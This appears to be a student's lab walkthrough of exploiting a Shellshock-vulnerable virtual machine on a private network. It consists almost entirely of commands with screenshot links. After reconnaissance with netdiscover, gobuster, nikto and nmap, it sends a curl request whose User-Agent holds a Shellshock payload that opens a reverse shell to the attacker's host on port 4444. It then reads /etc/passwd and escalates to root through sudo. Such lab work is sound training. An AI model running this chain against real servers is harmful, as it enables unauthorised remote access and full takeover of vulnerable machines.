# Shellshock 192.168.56.116
## Andrea Zonnekus 18758119

sudo netdiscover -i eth0

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.001.png)

gobuster dir -u 192.168.56.116 -w /usr/share/dirb/wordlists/big.txt

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.002.png)

nikto --host http://192.168.56.116 -C all

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.003.png)

nmap -p80 192.168.56.116 -sV --script=http-shellshock --script-args uri=/cgi-bin/status,cmd=ls

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.004.png)



sudo nmap -F -O 192.168.56.116

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.005.png)

curl -A "() { :;}; /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0<&1 2>&1" <http://192.168.56.116/cgi-bin/status>

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.006.png)

uname -a

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.007.png)

cat /etc/passwd

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.008.png)

sudo -l

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.009.png)

sudo /bin/bash -i

![](shellshock_steps/Aspose.Words.c0a78bda-4537-4f8e-bb94-0cc4b7ae615b.010.png)
